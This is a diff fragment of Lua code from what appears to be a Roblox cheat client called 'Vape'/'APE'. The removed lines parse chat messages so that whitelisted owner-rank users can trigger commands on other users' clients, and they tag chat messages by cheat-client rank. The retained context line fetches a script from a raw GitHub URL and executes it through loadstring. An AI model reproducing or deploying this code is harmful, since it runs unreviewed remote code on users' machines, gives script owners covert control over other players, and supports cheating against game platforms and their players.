-		for i,v in pairs(commands) do
-			if tostring(i) == tostring(message.Text).." default" or tostring(i) == tostring(message.Text).." "..lplr.DisplayName or tostring(i) == tostring(message.Text) then
-				local plr
-				for i,v in pairs(game.Players:GetPlayers()) do
-					if tostring(v.UserId) == userId then
-						plr = v
-						break
-					end
-				end
-				if plr == nil then break end
-				if not CanAttackUser(plr) then
-					v()
-				end
-				break
-			end
-		end
-		local colors = {
-			["red"] = "#ff0000",
-			["orange"] = "#ff7800",
-			["yellow"] = "#e5ff00",
-			["green"] = "#00ff00",
-			["blue"] = "#0000ff",
-			["purple"] = "#b800b8",
-			["pink"] = "#ff00ff",
-			["black"] = "#000000",
-			["white"] = "#ffffff",
-			["cyan"] = "#00FFFF",
-		}
-		if CanAttackUser(plr2) and plr2 ~= lplr then
-			if message.Text:find("alabamababy") then
-				warningNotification("Vape",plr2.Name.." is using APE!",60)
-				table.insert(users,plr2.UserId)
-				table.insert(whitelist["tags"],{
-					userid = plr2.UserId,
-					color = "yellow",
-					tag = "APE USER"
-				})
-			end
-		end
-		if message.Text:lower():find("alabamababy") or message.Text:lower():find("you are now privately chatting") then 
-			p.PrefixText = "<font color='"..colors["yellow"].."'>[APE USER]</font> " .. msg.PrefixText
-			return p
-		end
-		for i,v in pairs(commands) do
-			if tostring(i) == tostring(message.Text) then
-				local plr
-				for i,v in pairs(game.Players:GetPlayers()) do
-					if tostring(v.UserId) == userId then
-						plr = v
-						break
-					end
-				end
-				if plr == nil or plr == lplr then break end
-				if not CanAttackUser(plr) then
-					v()
-				end
-				break
-			end
-		end
-		p.PrefixText = msg.PrefixText
-		print(message.Text,":",userId)
-
-		local userType = 0
-		local hasTag = false
-		if users[plr2.UserId] ~= nil then
-			p.PrefixText = "<font color='"..colors["yellow"].."'>[APE USER]</font> " .. msg.PrefixText
-			hasTag = true
-			return p
-		end
-
-		if whitelist["tags"] ~= nil then
-			for i, v in pairs(whitelist["tags"]) do
-				if v.userid == userId then
-					hasTag = true
-					local color = colors[v.color] or colors["pink"]
-					p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
-				end
-			end
-		end
-
-		if whitelist["Private"] ~= nil then
-			for i, v in pairs(whitelist["Private"]) do
-				if v.id == userId then
-					if not hasTag then
-						hasTag = true
-						p.PrefixText = "<font color='"..colors["purple"].."'>[APE PRIVATE]</font> " .. msg.PrefixText
-					end
-					userType = 1
-				end
-			end
-		end
-
-		if whitelist["Owner"] ~= nil then
-			for i, v in pairs(whitelist["Owner"]) do
-				if v.id == userId then
-					if not hasTag then
-						hasTag = true
-						p.PrefixText = "<font color='#ff0000'>[APE OWNER]</font> " .. msg.PrefixText
-					end
-					userType = 4
-				end
-			end
-		end
-
-		if whitelist["PrivatePlus"] ~= nil then
-			for i, v in pairs(whitelist["PrivatePlus"]) do
-				if v.id == userId then
-					if not hasTag then
-						hasTag = true
-						p.PrefixText = "<font color='"..colors["pink"].."'>[APE PRIVATE+]</font> " .. msg.PrefixText
-					end
-					userType = 2
-				end
-			end
-		end
-		
-		if whitelist["CoOwner"] ~= nil then
-			for i, v in pairs(whitelist["CoOwner"]) do
-				if v.id == userId then
-					if not hasTag then
-						hasTag = true
-						p.PrefixText = "<font color='"..colors["black"].."'>[CO-APE OWNER]</font> " .. msg.PrefixText
-					end
-					userType = 3
-				end
-			end
-		end
-		
-		if whitelist["RayHafz"] ~= nil then
-			for i, v in pairs(whitelist["RayHafz"]) do
-				if v.id == userId then
-					if not hasTag then
-						hasTag = true
-						p.PrefixText = "<font color='"..colors["pink"].."'>[RayHafz Femboy💜]</font> " .. msg.PrefixText
-					end
-					userType = 5
-				end
-			end
-		end
-	end
-
-	return p
-end
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()
 
